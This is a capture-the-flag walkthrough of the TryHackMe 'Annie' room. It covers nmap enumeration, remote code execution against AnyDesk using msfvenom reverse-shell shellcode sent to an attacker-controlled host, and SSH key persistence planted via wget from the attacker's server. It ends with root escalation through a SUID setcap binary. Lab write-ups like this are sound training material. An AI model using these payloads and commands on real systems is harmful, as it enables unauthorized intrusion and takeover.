<p align="center">
  THM : Annie<br>
  Difficulty : Medium<br>
  Room link : https://tryhackme.com/room/annie<br>
  <img src="https://i.imgur.com/JUHgBA0.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Port 7070 enumeration](#port-7070-enumeration)
- [AnyDesk exploitation](#anydesk-exploitation)
- [Get a better shell](#get-a-better-shell)
- [Linux enumeration](#linux-enumeration)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Let's use [nmap](https://nmap.org/book/man.html) to scan the target for open ports and services :  
```
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-11 16:49 CET
Nmap scan report for 10.10.37.134
Host is up (0.055s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE         VERSION
22/tcp    open  ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
|_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
7070/tcp  open  ssl/realserver?
37007/tcp open  unknown
| fingerprint-strings: 
|   NULL: 
|     i`<oJC
|     4/#>o
|     #X~a
|     H|ppm*
|     _iUsv
|     7H7v
|     EY;)
|     UH!}k
|     s,-4
|     ~kB2
|     -*3#
|     BkeU
|     E>TW
|_    p*Ax+
42617/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port37007-TCP:V=7.80%I=7%D=3/11%Time=640CA34D%P=x86_64-pc-linux-gnu%r(N
SF:ULL,FD2,"\x0f\xd0\xed\x20\.\x9e\xe3\x8d\xa7\x89&\x7f\x10\xb2\xdeR\xc0\x
SF:dai`<oJC\xf0\xbf1\xb3\xb4\xfd\x8c\xe2!\x16\xc9\xe7\xbee\xfb\t\xfd'\xe6\
SF:xe0\xa7\xbf\xa2\x84\x03'\xc3{\x9c\xea\xf4\xe8ys\\@\xa5\t\xf2\xe8\xe3\xe
SF:8<\|\xb2{`\"\xaa\x80\x99\xddTD\x13\xc3\x92Z\xfc\xb4\xb7!\xe0TC\r\xea\xc
SF:d:\xd9`\xc1\xc1\x8eO\xd9x`\x916\*\xd4\xcb\(\x13/9\xde\x844/#>o\x9a\x10#
SF:X~a\xdbi\"\x06\xb1\x9dU\xf8\xcd\n\x94\xb7p'\xdf\xbb6o\xc3w\xbf\xc0\xf5\
SF:x82\xb4Qt\xa4\x0f\xb1\x04\xe5:E\xe6\xd2\xcd\xd4P\xb8\xe8\xf3\xcb\xf0\rP
SF:\x0c\xc7\x0b\xa3\xeb\x9e\x150\xfd\xcf\x1bl\xae\xe7\xd3\xd9Y\xc6H\|ppm\*
SF:\xff\x13\xf918}\x1aB<\x10\xa7G\xda3\x91v\x13\xc1\xaa\x14~\x84\xd6\x90\x
SF:8b\xe0D\x97\$H3\x16\x9eb\xfc\x0f\xc7\x1a\$q\xef\x14\x19'd\)\x14HE@\x86\
SF:0aI\xb5\xcf\(\xfaQ\xdf5\+\x11\xe0\[\xa8\x8f\x01\xcf\?\x1cD\xc3\xf4u\xe9
SF:\x0b\x1b_\x8c\x9d\xe4:\x8a\x93\x19\xbc\xed\xe7\x1cS\xd7_iUsv\xd8\xf7\x7
SF:f\x85\xe2\x9b\x95\xe0\xb4\xdc\xedi\x86\r\x12\xb9x\xb7}3S\xc0b\x18\xdc\x
SF:a5\t\xc67H7v\xdd\xbb\xd7\x0eI\^\+\xfc\x7f\x85;vm\x0c\xb8N\xa5\xf2\x0c\x
SF:f5\xb8\x81\x15K\xb5\xd1\xc8\xcc\"\(\xf3\x98\xe5\(\x8eP8\xcb\xa6<\x83\xc
SF:a\xda\xc3\xc4\xa4Q\nD\x9b\x85r\x93\xf1p\xaf\xf8\xf4\xff\x03\xfcP\xabN6J
SF:\x9eC\xfdA\x17Q\x9e\xf5\xf5\x8ct\x07\x15\x7f%\t\xc2O\x93\x8b\xf8\x0fm\x
SF:02U\xacI\xaf\xa4\xd1\xe4\x9f\xfc\x9fvA\$\xd0\x1d\x94\x01\x84\x05\xcb-\x
SF:19`\xc3\xd5P\xab\x0cs\xf2\x80\x8e\xbd\xfd\x11\xca\x1e\x94c\x8f\xd9\xbb\
SF:x84s\xde\xd8\x19\+\x93d\xa4\xc8U\x82\x18\x7f\x17@\?/\xd4\*\r\x98\xacr\x
SF:fc\x15D\xc8\xbc\x0b\xbf\xa7\t\xc7\xa1A\xd48\|\xae\x13\x02JF\x1c\x9f\xe1
SF:\xf5\x19\xe4\xdcEY;\)\xf4p\xc3\xfd\xf9\x9f\\UH!}k\x92\x97\x073;\xa8Gm\x
SF:90\x1ap\x1b\xb0\$s\x1e\xf1\.P\x1ak\x03\xa2\xb38\x0b\[\x89\xf2\xf9\x20M\
SF:x8fG\x847\xf0\xb2\xbe\x20\x9b\xd6\xbc\x87\xde\x89&\xa3\xcb\x1a\xf5\xd2\
SF:x1euh\x1el\xd7\xdfi\xbdt\x81\xbdw\xf8\x08\xb0\xd7i\xe01vW\x0e\xf9/\xa1\
SF:xf6\xa33B\x9cx\x8d\xe9\xb2\xcf\xd7H\xfbG\xb7I\x86\xba\xb4s,-4\xf9\x0e\x
SF:c8E\xd1\xde\x8d\x99\$\xd9O\xa7\xf7\xc0\xd7/\xfa\x88\xca\x97uw\xc4\xddA\
SF:xfc\$L\xfb\xc5`\x80\xe3\xd3\x04\xdeV\xde\x99\[Z\xe3\x15\xaa`s\x91\x86O\
SF:xb0\"\x1a\xa0~\n\x12\xd6\x97\x0fO\xc2t=\xa16\xd5y\xb4~kB2\xbf\xc6\x01C\
SF:x88\xeb\xb1@e\x19\x8cY\xef\xb8\xff\xd6\xd3u\xc1\xb7\xc2-\*3#\xe5\xe4=\x
SF:1a\x85\x16b\xc4\xeeW\x11\xda#y\xaaBkeU\x95\xaa\xc9L\x82\xa0\x93\x8f\x1d
SF:\x85\xf4\xa2\x89\x9f\xe2\xfc\xfd\xbcWy\x93\xdb\x18\x9aE>TW\x90\x84v\x1f
SF:E\xfb\xae\xec0\xc5\x06\xf0\xbf\xebO\x1b\.\xbd&=\x16\xdb\xa4\x0b\xf0\x82
SF:F\x13\xdb\xcf\x07\x1e\n\xcb0\xb8\xd4\x20\xaa\x1d\xae\x98\xafJ\0Y\xbe\xb
SF:5/4\x85\xfdg5S\xf9p\x8a\x93\x99\xa3\x20P\x88\x86!\xf5\xb1\x9e\xa2:\xc6/
SF:\xff\x03/WM\xfa\x98VK\x9e\x92,6L\x7fNf\xebv\xf1W\)\xfd\xa8\xe0\x9c\x943
SF:\xball\x0c\x94a\xe6y\xa3\xc8=\xfb-\x0f_\x08\xf1\xe2\xc8\?\x15p\*Ax\+\x8
SF:a\xb1w\xbd=\x90");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.12 seconds
```

## Port 7070 enumeration

Let's take a look at port 7070 using a web browser (don't forget to add `https://` at the beginning of the url) :  
![](https://i.imgur.com/gejc407.jpg)  

Let's take a look at the SSL certificate :  
![](https://i.imgur.com/OwbuGyb.jpg)  

So there is AnyDesk installed on this host. It's a remote desktop application. Let's see if it is vulnerable to anything :  
![](https://i.imgur.com/fLdhMIX.jpg)  

It is vulnerable to an RCE (Remote Code Execution).

## AnyDesk exploitation

Let's download the RCE exploit from https://www.exploit-db.com/exploits/49613. Now, we have to edit the target IP address :  
![](https://i.imgur.com/9Jsxv8y.jpg)  

Then, we need to generate a shellcode using msfvenom :  
```
attacker@AttackBox:~/Annie$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.14.32.60 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 4 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=17, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of python file: 680 bytes
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x14\xe5\x38"
shellcode += b"\xa0\x42\x13\x0b\x77\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x7e\xcc\x60\x39\x28"
shellcode += b"\x11\x54\x1d\x15\xbb\x37\xa5\x0a\x84\x43\xce"
shellcode += b"\x16\xe5\x29\xfc\x48\x1d\x2b\x4b\x45\xad\xb1"
shellcode += b"\x46\x28\x03\x51\x1d\x3e\xbd\x37\xa5\x28\x10"
shellcode += b"\x55\x3f\xeb\x2b\x52\x81\x1a\x1c\x0e\x02\xe2"
shellcode += b"\x8f\x03\xf8\xdb\x5b\xb0\x58\x76\x8c\x56\x8f"
shellcode += b"\x31\x7b\x0b\x24\x5c\x6c\xdf\xf2\x15\x5b\x82"
shellcode += b"\x91\x1b\xe0\x38\xa0\x42\x13\x0b\x77"
```

Next, we have to replace the default shellcode of the exploit with our new generated shellcode :  
![](https://i.imgur.com/WrLMjCy.jpg)  

Now, we can start a netcat listener on our machine to get a reverse shell :  
```
attacker@AttackBox:~/Annie$ nc -lnvp 4444
listening on [any] 4444 ...
```

Then, we can run the exploit :  
```
attacker@AttackBox:~/Annie$ python exploit.py 
sending payload ...
reverse shell should connect within 5 seconds
```

Finally, let's take a look at our netcat listener :  
```
attacker@AttackBox:~/Annie$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.157.42] 60154
whoami
annie
```

And we have a shell as `annie` ! 

## Get a better shell 

Let's generate a pair of ssh keys on our attacker machine :  
```
attacker@AttackBox:~/Annie$ ssh-keygen -f id_rsa
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:uTFU6xn2zLppUgd+krFAjbRvY3apiE/y+eYXufAvuOQ attacker@AttackBox
The key's randomart image is:
+---[RSA 3072]----+
|       ..o.      |
|        oo..     |
|       .o +      |
|       ..=o* .   |
|        SoO=*.   |
|       . OB==    |
|      o +.+B o   |
|       =.++o=    |
|        +*Eo o.  |
+----[SHA256]-----+
```

Then, we can start a webserver using python3 :  
```
attacker@AttackBox:~/Annie$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Now, we can download the public key we generated on the target host :  
```
cd /home/annie/.ssh
wget http://10.14.32.60:8080/id_rsa.pub -O authorized_keys
--2023-03-11 09:54:02--  http://10.14.32.60:8080/id_rsa.pub
Connecting to 10.14.32.60:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 572 [application/vnd.exstream-package]
Saving to: 'authorized_keys'

     0K                                                       100%  586K=0.001s

2023-03-11 09:54:02 (586 KB/s) - 'authorized_keys' saved [572/572]
```

Then, we can try to use our own private key to log in as `annie` via SSH :  
```
attacker@AttackBox:~/Annie$ ssh annie@10.10.157.42 -i id_rsa 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-173-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat May 14 16:03:44 2022 from 192.168.58.128
annie@desktop:~$
```

Now we have a better shell !

## Linux enumeration

First, let's get the user flag :  
```
annie@desktop:~$ cat user.txt
THM{****************}
```
Let's see if we can find any interesting SUID binary :  
```
annie@desktop:~$ find / -type f -perm -4000 2>/dev/null
/sbin/setcap
/bin/mount
/bin/ping
/bin/su
/bin/fusermount
/bin/umount
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
```

One binary took my attention, `setcap`. It is a binary used to edit capabillities of a binary.

## Privilege escalation

We should be able to use this to get a shell as root.
Let's copy `/usr/bin/python3` in our home directory first, and then, we can give it the `cap_setuid+ep` capabillity :  
```
annie@desktop:~$ cp /usr/bin/python3 ./
annie@desktop:~$ setcap cap_setuid+ep ./python3
```

Now, let's run this binary and try to spawn a shell as root :  
```
annie@desktop:~$ ./python3 
Python 3.6.9 (default, Dec  8 2021, 21:08:43) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
```

After pressing enter :  
```
root@desktop:~# id
uid=0(root) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
root@desktop:~#
```

We are root ! Let's get the root flag :  
```
root@desktop:~# cd /root
root@desktop:/root# cat root.txt 
THM{*********************}
```

## Conclusion

In this room, we practiced :  
- Services and open ports enumeration using [nmap](https://nmap.org/book/man.html)
- Anydesk RCE exploitation
- Linux basic enumeration
- Linux privilege escalation using [setcap](https://man7.org/linux/man-pages/man8/setcap.8.html)

Thanks for this room and thanks for reading my write ups !
